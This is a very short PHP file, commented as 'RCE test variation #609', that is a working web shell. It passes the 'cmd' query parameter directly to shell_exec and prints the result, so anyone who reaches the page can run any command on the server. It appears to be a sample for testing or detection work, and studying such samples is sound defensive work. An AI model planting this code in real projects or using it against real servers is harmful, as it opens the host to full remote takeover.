<?php
// RCE test variation #609
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>